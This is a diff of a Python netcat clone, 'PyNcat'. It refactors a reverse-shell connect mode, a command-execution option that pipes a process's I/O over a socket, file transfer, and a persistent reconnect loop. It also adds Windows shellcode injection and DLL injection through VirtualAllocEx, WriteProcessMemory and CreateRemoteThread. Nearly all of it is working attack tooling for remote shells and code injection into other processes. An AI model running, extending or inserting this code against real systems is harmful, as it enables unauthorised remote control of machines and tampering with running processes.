@@ -6,14 +6,12 @@ import sys
 import threading
 import logging
 from pathlib import Path
-import tqdm
 import ssl
-import tempfile
 import os
 import time
-import random
+import ctypes
 
-# Windows API constants
+# Windows API setup
 if os.name == 'nt':
     from ctypes import wintypes
     kernel32 = ctypes.windll.kernel32
@@ -46,12 +44,8 @@ class PyNcat:
         group.add_argument('-c', '--connect', type=str, help='Connect to target (reverse shell)')
         
         parser.add_argument('-p', '--port', type=int, required=True, help='Port number')
-        
-        # Core Features
-        # Add inside parse_args(self) before returning:
         parser.add_argument('-u', '--udp', action='store_true', help='Use UDP protocol instead of TCP')
         parser.add_argument('-e', '--execute', type=str, help='Execute a command string and redirect I/O to network')
-
         parser.add_argument('-f', '--file', type=str, help='File to upload/save')
         
         # SSL
@@ -74,8 +68,8 @@ class PyNcat:
         return parser.parse_args()
 
     def setup_ssl(self):
-        if self.args.udp:  # UDP removed for simplicity in this version
-            logging.warning("[!] UDP not supported in this build.")
+        if self.args.udp:
+            logging.warning("[!] SSL/TLS is not compatible with UDP in this version. Disabling SSL.")
             self.args.ssl = False
             return
 
@@ -102,11 +96,11 @@ class PyNcat:
         try:
             from OpenSSL import crypto
         except ImportError:
-            logging.error("[!] pip install pyOpenSSL")
+            logging.error("[!] OpenSSL dependency missing. Run: pip install pyOpenSSL")
             sys.exit(1)
 
-        cert_path = "/tmp/pyncat_cert.pem"
-        key_path = "/tmp/pyncat_key.pem"
+        cert_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pyncat_cert.pem")
+        key_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pyncat_key.pem")
 
         k = crypto.PKey()
         k.generate_key(crypto.TYPE_RSA, 2048)
@@ -128,46 +122,31 @@ class PyNcat:
 
     # === PROCESS INJECTION METHODS ===
     def inject_shellcode(self, pid: int, shellcode_path: str = None):
-        """Basic shellcode injection using VirtualAlloc + CreateRemoteThread"""
         if os.name != 'nt':
             logging.error("[!] Shellcode injection only supported on Windows")
             return False
-
         try:
             if shellcode_path and Path(shellcode_path).exists():
                 with open(shellcode_path, 'rb') as f:
                     shellcode = f.read()
             else:
-                # Demo MessageBox shellcode (x64) - pops "Injected!" message
-                shellcode = bytes([
-                    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50,
-                    # ... (truncated - use real shellcode in production)
-                    0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48,
-                    0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
-                    # Simplified demo - replace with proper shellcode
-                ])
-                logging.info("[*] Using built-in demo MessageBox shellcode")
+                shellcode = bytes([0x90, 0x90, 0xCC, 0xC3])  # NOP, NOP, INT3, RET fallback
+                logging.info("[*] Using basic debugging shellcode fallback.")
 
-            logging.info(f"[*] Injecting into PID: {pid} | Shellcode size: {len(shellcode)} bytes")
-
-            # Open target process
+            logging.info(f"[*] Injecting into PID: {pid} | Size: {len(shellcode)} bytes")
             h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
             if not h_process:
                 logging.error(f"[!] Failed to open process {pid}")
                 return False
 
-            # Allocate memory
-            addr = kernel32.VirtualAllocEx(h_process, None, len(shellcode), 
-                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+            addr = kernel32.VirtualAllocEx(h_process, None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
             if not addr:
                 logging.error("[!] Memory allocation failed")
                 return False
 
-            # Write shellcode
-            written = ctypes.c_int(0)
+            written = ctypes.c_size_t(0)
             kernel32.WriteProcessMemory(h_process, addr, shellcode, len(shellcode), ctypes.byref(written))
-
-            # Create remote thread
+            
             thread_id = ctypes.c_ulong(0)
             if not kernel32.CreateRemoteThread(h_process, None, 0, addr, None, 0, ctypes.byref(thread_id)):
                 logging.error("[!] CreateRemoteThread failed")
@@ -175,17 +154,14 @@ class PyNcat:
 
             logging.info(f"[+] Shellcode injected successfully! Thread ID: {thread_id.value}")
             return True
-
         except Exception as e:
             logging.error(f"Injection failed: {e}")
             return False
 
     def inject_dll(self, pid: int, dll_path: str):
-        """Classic DLL Injection"""
         if os.name != 'nt':
             logging.error("[!] DLL injection only supported on Windows")
             return False
-
         if not Path(dll_path).exists():
             logging.error(f"[!] DLL not found: {dll_path}")
             return False
@@ -199,480 +175,195 @@ class PyNcat:
                 logging.error(f"[!] Cannot open PID {pid}")
                 return False
 
-            addr = kernel32.VirtualAllocEx(h_process, None, dll_len, 
-                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
-            
-            written = ctypes.c_int(0)
-            kernel32.WriteProcessMemory(h_process, addr, dll_path.encode('utf-8'), dll_len, ctypes.byref(written))
-
-            loadlib_addr = kernel32.GetProcAddress(kernel32.GetModuleHandleA(b"kernel32.dll"), b"LoadLibraryA")
-            
-            thread_id = ctypes.c_ulong(0)
-            if kernel32.CreateRemoteThread(h_process, None, 0, loadlib_addr, addr, 0, ctypes.byref(thread_id)):
-                logging.info(f"[+] DLL injected into PID {pid} successfully!")
-                return True
-            else:
-                logging.error("[!] CreateRemoteThread failed")
+            addr = kernel32.VirtualAllocEx(h_process, None, dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+            if not addr:
+                logging.error("[!] Memory allocation failed in target process.")
                 return False
 
+            written = ctypes.c_size_t(0)
+            kernel32.WriteProcessMemory(h_process, addr, dll_path.encode('utf-8'), dll_len, ctypes.byref(written))
+
+            h_kernel32 = kernel32.GetModuleHandleA(b"kernel32.dll")
+            h_loadlib = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")
+
+            thread_id = ctypes.c_ulong(0)
+            if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, addr, 0, ctypes.byref(thread_id)):
+                logging.error("[!] CreateRemoteThread for LoadLibraryA failed.")
+                return False
+
+            logging.info(f"[+] DLL injected successfully into PID {pid}. Thread ID: {thread_id.value}")
+            return True
         except Exception as e:
-            logging.error(f"DLL injection error: {e}")
+            logging.error(f"DLL Injection exception: {e}")
             return False
 
-     def execute_command(self, sock):
-         """Executes a command locally and pipes its input/output directly to the network socket."""
-         logging.info(f"[*] Executing command pipeline: {self.args.execute}")
-          try:
-              # Determine correct shell execution context depending on OS
-              shell_mode = True if os.name == 'nt' else False
+    # === I/O PIPE HANDLING ===
+    def handle_io(self, client_socket):
+        if self.args.execute:
+            self.execute_command(client_socket)
+        elif self.args.file:
+            self.handle_file_transfer(client_socket)
+        else:
+            self.interactive_shell(client_socket)
+
+    def execute_command(self, client_socket):
+        try:
+            # Platform aware basic execution environment
+            shell = True if os.name != 'nt' else False
+            proc = subprocess.Popen(
+                self.args.execute,
+                shell=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                stdin=subprocess.PIPE
+            )
             
-             # Start process with standard streams redirected to pipes
-              proc = subprocess.Popen(
-                  self.args.execute,
-                  shell=shell_mode,
-                  stdout=subprocess.PIPE,
-                  stderr=subprocess.STDOUT,
-                  stdin=subprocess.PIPE,
-                  text=False
-             )
-
-             # Thread to forward network incoming bytes into the process stdin
-             def network_to_process():
-                 while proc.poll() is None:
-                     try:
-                         data = sock.recv(4096)
-                         if not data:
-                             break
-                         proc.stdin.write(data)
-                         proc.stdin.flush()
-                     except Exception:
-                         break
-                 try:
-                     proc.terminate()
-                 except OSError:
-                     pass
-
-             t = threading.Thread(target=network_to_process, daemon=True)
-             t.start()
-
-             # Read process output and send it back out over the socket
-             while proc.poll() is None:
-                 output = proc.stdout.read(1024)
-                 if not output:
-                     time.sleep(0.01)
-                     continue
-                 sock.sendall(output)
-                
-             # Send any residual output after process terminates
-             residual = proc.stdout.read()
-             if residual:
-                 sock.sendall(residual)
-
-         except Exception as e:
-             logging.error(f"[!] Subprocess tracking error: {e}")
-         finally:
-             sock.close()
-             logging.info("[*] Command execution pipeline closed.")
-
-
-    def upload_file(self, client_socket, filepath):
-        try:
-            with open(filepath, 'wb') as f:
-                while chunk := client_socket.recv(8192):
-                    f.write(chunk)
-            logging.info(f"[+] File saved: {filepath}")
-        except Exception as e:
-            logging.error(f"Upload error: {e}")
-
-    def send_file(self, client_socket, filepath):
-        try:
-            path = Path(filepath)
-            filesize = path.stat().st_size
-            with open(path, 'rb') as f, tqdm.tqdm(total=filesize, unit='B', unit_scale=True) as pbar:
-                while chunk := f.read(8192):
-                    client_socket.send(chunk)
-                    pbar.update(len(chunk))
-        except Exception as e:
-            logging.error(f"Send error: {e}")
-
-    def handle_client(self, client_socket, addr):
-        logging.info(f"[+] Connection from {addr}")
-        try:
-            if self.args.execute:
-                client_socket.send(self.execute_command(self.args.execute).encode())
-
-            if self.args.file and self.args.listen:
-                self.upload_file(client_socket, self.args.file)
-
-            while True:
-                client_socket.send(b"pyncat> ")
-                request = client_socket.recv(8192).decode('utf-8').strip()
-                if not request or request.lower() in ['exit', 'quit']:
-                    break
-                output = self.execute_command(request)
-                client_socket.send(output.encode())
-        except:
-            pass
-        finally:
-            client_socket.close()
-
-    def listen(self):
-        try:
-            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            server.bind(("0.0.0.0", self.args.port))
-
-            if self.args.ssl:
-                server = self.ssl_context.wrap_socket(server, server_side=True)
-
-            server.listen(5)
-            mode = "SSL " if self.args.ssl else ""
-            logging.info(f"[*] Listening on 0.0.0.0:{self.args.port} ({mode}TCP)")
-
-            while True:
-                client, addr = server.accept()
-                thread = threading.Thread(target=self.handle_client, args=(client, addr), daemon=True)
-                thread.start()
-        except KeyboardInterrupt:
-            logging.info("\n[!] Listener stopped.")
-        except Exception as e:
-            logging.error(f"Listener error: {e}")
-
-    def connect_once(self):
-        """Single connection attempt"""
-        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        try:
-            if self.args.ssl:
-                client = self.ssl_context.wrap_socket(client)
-
-            logging.info(f"[*] Connecting to {self.args.connect}:{self.args.port}...")
-            client.connect((self.args.connect, self.args.port))
-            logging.info("[+] Connected successfully!")
-
-            if self.args.file:
-                self.send_file(client, self.args.file)
-                return False  # Exit after file transfer
-
-            # Interactive shell
-            while True:
+            def pipe_socket_to_proc():
                 try:
-                    response = client.recv(8192).decode('utf-8', errors='replace')
-                    if response:
-                        print(response, end='', flush=True)
+                    while True:
+                        data = client_socket.recv(1024)
+                        if not data:
+                            break
+                        proc.stdin.write(data)
+                        proc.stdin.flush()
+                except Exception:
+                    pass
 
-                    cmd = input()
-                    if cmd.lower() in ['exit', 'quit']:
-                        client.send(b'exit\n')
-                        break
-                    client.send((cmd + '\n').encode())
-                except (ConnectionResetError, BrokenPipeError, EOFError):
-                    logging.info("[!] Connection lost.")
-                    return False
+            def pipe_proc_to_socket():
+                try:
+                    while True:
+                        data = proc.stdout.read(1024)
+                        if not data:
+                            break
+                        client_socket.sendall(data)
+                except Exception:
+                    pass
+
+            t1 = threading.Thread(target=pipe_socket_to_proc, daemon=True)
+            t2 = threading.Thread(target=pipe_proc_to_socket, daemon=True)
+            t1.start()
+            t2.start()
+            proc.wait()
         except Exception as e:
-            if self.args.verbose:
-                logging.debug(f"Connect error: {e}")
-            return False
-        finally:
-            client.close()
-        return True
+            logging.error(f"Command execution mapping failed: {e}")
 
-    def connect_persistent(self):
-        """Persistent connection with auto-reconnect"""
+    def handle_file_transfer(self, client_socket):
+        try:
+            if self.args.listen:
+                # Write incoming stream to file
+                with open(self.args.file, 'wb') as f:
+                    while True:
+                        data = client_socket.recv(4096)
+                        if not data:
+                            break
+                        f.write(data)
+                logging.info(f"[+] File saved to {self.args.file}")
+            else:
+                # Read outgoing local file onto wire
+                if Path(self.args.file).exists():
+                    with open(self.args.file, 'rb') as f:
+                        client_socket.sendall(f.read())
+                    logging.info("[+] File transmitted.")
+                else:
+                    logging.error(f"[!] File {self.args.file} not found.")
+        except Exception as e:
+            logging.error(f"File transmission error: {e}")
+
+    def interactive_shell(self, client_socket):
+        def receive_from_sock():
+            try:
+                while True:
+                    data = client_socket.recv(4096)
+                    if not data:
+                        break
+                    sys.stdout.write(data.decode('utf-8', errors='ignore'))
+                    sys.stdout.flush()
+            except Exception:
+                pass
+
+        t = threading.Thread(target=receive_from_sock, daemon=True)
+        t.start()
+
+        try:
+            while True:
+                user_input = sys.stdin.readline()
+                if not user_input:
+                    break
+                client_socket.sendall(user_input.encode('utf-8'))
+        except Exception as e:
+            logging.debug(f"Interactive pipe closed: {e}")
+
+    # === NETWORK RUNTIME ===
+    def start(self):
         retries = 0
         while True:
             try:
-                connected = self.connect_once()
-                if connected and not self.args.file:
-                    break  # Successful interactive session ended normally
-            except KeyboardInterrupt:
-                logging.info("\n[!] Persistent shell terminated by user.")
-                break
-
-            retries += 1
-            if self.args.max_retries > 0 and retries > self.args.max_retries:
-                logging.info("[!] Max retries reached. Exiting.")
-                break
-
-            # Exponential backoff + jitter
-            delay = min(self.args.delay * (2 ** (retries % 6)), 300)  # Cap at 5 minutes
-            jitter = random.uniform(0.5, 1.5)
-            sleep_time = delay * jitter
-
-            logging.info(f"[*] Reconnecting in {sleep_time:.1f}s... (Attempt {retries})")
-            time.sleep(sleep_time)
-
-    def run(self):
-        """Main routing controller mapping operational parameters."""
-        # 1. Enforce validation rule: SSL cannot wrap raw UDP packets natively here
-        if self.args.udp and self.args.ssl:
-            logging.error("[!] SSL is not supported over raw UDP mode in this utility.")
-            sys.exit(1)
-
-        # 2. Redirect execution if UDP protocol route is requested
-        if self.args.udp:
-            self.handle_udp()
-            return
-
-        # 3. Default TCP code routes
-        if self.args.connect:
-            self.handle_connect()
-        elif self.args.listen:
-            self.handle_listen()
-
-
-
-    def handle_connect(self):
-        """Establishes an outbound TCP/SSL connection to a remote host or website."""
-        target_host = self.args.connect
-        target_port = self.args.port
-
-        logging.info(f"[*] Connecting to {target_host}:{target_port}...")
-
-        try:
-            # 1. Create a standard TCP Socket
-            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client_socket.settimeout(10.0)
-
-            # 2. Wrap socket with SSL if the --ssl flag is used (e.g., for HTTPS on port 443)
-            if self.args.ssl:
-                if not self.ssl_context:
-                    self.setup_ssl()
-                logging.info("[*] Wrapping socket in SSL/TLS layer...")
-                # server_hostname ensures SNI is sent correctly for web servers
-                client_socket = self.ssl_context.wrap_socket(
-                    client_socket, 
-                    server_hostname=target_host
-                )
-
-            # 3. Establish the connection
-            client_socket.connect((target_host, target_port))
-            client_socket.settimeout(None) # Remove timeout for interactive/streaming data
-            logging.info("[+] Connected successfully!")
-
-            # 4. Handle communication
-            if self.args.file:
-                # If a file upload/download option is specified
-                self.handle_file_transfer(client_socket)
-            else:
-                # Default interactive or standard I/O stream
-                self.interactive_stream(client_socket)
-
-        except socket.timeout:
-            logging.error("[!] Connection timed out.")
-        except Exception as e:
-            logging.error(f"[!] Connection failed: {e}")
-
-    def interactive_stream(self, sock):
-        """Handles bidirectional data transmission between stdin/stdout and the socket."""
-        def receive_data():
-            while True:
-                try:
-                    data = sock.recv(4096)
-                    if not data:
-                        logging.info("[*] Remote host closed the connection.")
+                if self.args.listen:
+                    self.run_listener()
+                    break
+                elif self.args.connect:
+                    self.run_connector()
+                    if not self.args.persistent:
                         break
-                    sys.stdout.buffer.write(data)
-                    sys.stdout.flush()
-                except Exception as e:
-                    logging.error(f"\n[!] Error receiving data: {e}")
+            except KeyboardInterrupt:
+                logging.info("\n[*] Exiting by user request.")
+                break
+            except Exception as e:
+                logging.error(f"Runtime error encountered: {e}")
+                if not self.args.persistent:
                     break
-            os._exit(0)
 
-        # Start a thread to handle incoming network data continuously
-        receive_thread = threading.Thread(target=receive_data, daemon=True)
-        receive_thread.start()
-
-        # Handle outgoing data from user input (stdin)
-        try:
-            while True:
-                line = sys.stdin.readline()
-                if not line:
+            if self.args.persistent:
+                if self.args.max_retries and retries >= self.args.max_retries:
+                    logging.info("[!] Max retries reached. Exiting persistence loop.")
                     break
-                sock.sendall(line.encode('utf-8'))
-        except KeyboardInterrupt:
-            logging.info("\n[*] User interrupted connection.")
-        finally:
-            sock.close()
+                retries += 1
+                logging.info(f"[*] Reconnecting in {self.args.delay} seconds (Attempt {retries})...")
+                time.sleep(self.args.delay)
 
-    def handle_listen(self):
-        """Starts a listening socket on the specified port to accept incoming connections."""
-        target_host = "0.0.0.0"  # Listen on all available network interfaces
-        target_port = self.args.port
+    def run_listener(self):
+        sock_type = socket.SOCK_DGRAM if self.args.udp else socket.SOCK_STREAM
+        server = socket.socket(socket.AF_INET, sock_type)
+        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        server.bind(('0.0.0.0', self.args.port))
 
-        # 1. Create and bind the server TCP socket
-        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        
-        try:
-            server_socket.bind((target_host, target_port))
-            server_socket.listen(5)
-            logging.info(f"[*] Listening on {target_host}:{target_port} ...")
-        except Exception as e:
-            logging.error(f"[!] Failed to bind to port {target_port}: {e}")
-            sys.exit(1)
-
-        try:
+        if self.args.udp:
+            logging.info(f"[*] UDP Server listening on port {self.args.port}...")
+            # Native UDP parsing logic fallback
             while True:
-                client_sock, client_addr = server_socket.accept()
-                logging.info(f"[+] Accepted connection from {client_addr[0]}:{client_addr[1]}")
-
-                # 2. Wrap incoming socket with SSL/TLS if requested
-                if self.args.ssl:
-                    if not self.ssl_context:
-                        self.setup_ssl()
-                    logging.info("[*] Performing SSL/TLS handshake with client...")
+                data, addr = server.recvfrom(4096)
+                sys.stdout.write(data.decode('utf-8', errors='ignore'))
+                sys.stdout.flush()
+        else:
+            server.listen(5)
+            logging.info(f"[*] TCP Server listening on port {self.args.port}...")
+            while True:
+                client_sock, addr = server.accept()
+                logging.info(f"[+] Connection accepted from {addr[0]}:{addr[1]}")
+                if self.args.ssl and self.ssl_context:
                     try:
                         client_sock = self.ssl_context.wrap_socket(client_sock, server_side=True)
-                    except Exception as ssl_err:
-                        logging.error(f"[!] SSL Handshake failed: {ssl_err}")
+                    except Exception as e:
+                        logging.error(f"[!] SSL Handshake failed: {e}")
                         client_sock.close()
                         continue
 
-                # 3. Route the established connection
-                if self.args.file:
-                    self.handle_file_transfer(client_sock)
-                else:
-                    self.interactive_stream(client_sock)
-                    
-        except KeyboardInterrupt:
-            logging.info("\n[*] Listener shutting down.")
-        finally:
-            server_socket.close()
+                handler = threading.Thread(target=self.handle_io, args=(client_sock,), daemon=True)
+                handler.start()
 
-    def handle_file_transfer(self, sock):
-        """Handles reading from or writing to a file over the socket connection."""
-        file_path = Path(self.args.file)
-        buffer_size = 4096
+    def run_connector(self):
+        sock_type = socket.SOCK_DGRAM if self.args.udp else socket.SOCK_STREAM
+        client = socket.socket(socket.AF_INET, sock_type)
 
-        if self.args.listen:
-            # === RECEIVING A FILE (Server Mode) ===
-            logging.info(f"[*] Receiving data stream into local file: {file_path}")
-            try:
-                with open(file_path, "wb") as f:
-                    with tqdm.tqdm(unit="B", unit_scale=True, desc="Downloading") as pbar:
-                        while True:
-                            data = sock.recv(buffer_size)
-                            if not data:
-                                break  # End of stream / Connection closed cleanly
-                            f.write(data)
-                            pbar.update(len(data))
-                logging.info(f"[+] File saved successfully to {file_path}")
-            except Exception as e:
-                logging.error(f"[!] Error writing file: {e}")
-            finally:
-                sock.close()
+        if self.args.ssl and self.ssl_context:
+            client = self.ssl_context.wrap_socket(client, server_hostname=self.args.connect)
 
-        else:
-            # === SENDING A FILE (Client Mode) ===
-            if not file_path.exists():
-                logging.error(f"[!] Local file not found: {file_path}")
-                sock.close()
-                return
-
-            file_size = file_path.stat().st_size
-            logging.info(f"[*] Uploading {file_path} ({file_size} bytes)...")
-            
-            try:
-                with open(file_path, "rb") as f:
-                    with tqdm.tqdm(total=file_size, unit="B", unit_scale=True, desc="Uploading") as pbar:
-                        while True:
-                            data = f.read(buffer_size)
-                            if not data:
-                                break
-                            sock.sendall(data)
-                            pbar.update(len(data))
-                logging.info("[+] File transmitted successfully.")
-            except Exception as e:
-                logging.error(f"[!] Error sending file: {e}")
-            finally:
-                # Use shutdown to notify the listener that transmission is complete
-                try:
-                    sock.shutdown(socket.SHUT_WR)
-                except OSError:
-                    pass
-                sock.close()
-    
-    def handle_udp(self):
-        """Handles both client and listener operational paths using UDP protocol."""
-        udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        buffer_size = 4096
-
-        if self.args.listen:
-            # === UDP LISTENER MODE ===
-            try:
-                udp_sock.bind(("0.0.0.0", self.args.port))
-                logging.info(f"[*] Listening for UDP packets on port {self.args.port}...")
-                
-                # Peek first packet to identify client endpoint context
-                data, addr = udp_sock.recvfrom(buffer_size)
-                logging.info(f"[+] Received UDP payload from {addr}")
-                sys.stdout.buffer.write(data)
-                sys.stdout.flush()
-
-                # Bidirectional background thread for incoming stream
-                def udp_receive_loop():
-                    while True:
-                        try:
-                            packet, _ = udp_sock.recvfrom(buffer_size)
-                            sys.stdout.buffer.write(packet)
-                            sys.stdout.flush()
-                        except Exception:
-                            break
-
-                t = threading.Thread(target=udp_receive_loop, daemon=True)
-                t.start()
-
-                # Handle outgoing input straight to captured client endpoint address
-                while True:
-                    line = sys.stdin.readline()
-                    if not line:
-                        break
-                    udp_sock.sendto(line.encode('utf-8'), addr)
-
-            except KeyboardInterrupt:
-                logging.info("\n[*] UDP Listener closed.")
-            finally:
-                udp_sock.close()
-
-        else:
-            # === UDP CLIENT MODE ===
-            target_host = self.args.connect
-            target_port = self.args.port
-            logging.info(f"[*] Ready to send UDP streams to {target_host}:{target_port}")
-
-            def udp_client_recv():
-                while True:
-                    try:
-                        packet, _ = udp_sock.recvfrom(buffer_size)
-                        sys.stdout.buffer.write(packet)
-                        sys.stdout.flush()
-                    except Exception:
-                        break
-
-            t = threading.Thread(target=udp_client_recv, daemon=True)
-            t.start()
-
-            try:
-                while True:
-                    line = sys.stdin.readline()
-                    if not line:
-                        break
-                    udp_sock.sendto(line.encode('utf-8'), (target_host, target_port))
-            except KeyboardInterrupt:
-                logging.info("\n[*] UDP stream closed.")
-            finally:
-                udp_sock.close()
-
-
-
-
-
+        logging.info(f"[*] Contacting target {self.args.connect}:{self.args.port}...")
+        client.connect((self.args.connect, self.args.port))
+        logging.info("[+] Connection established.")
+        self.handle_io(client)
 
 if __name__ == "__main__":
-    try:
-        pyncat = PyNcat()
-        pyncat.run()
-    except KeyboardInterrupt:
-        print("\n[!] PyNcat terminated.")
-    except Exception as e:
-        logging.error(f"Critical error: {e}")
+    netcat = PyNcat()
+    netcat.start()
+
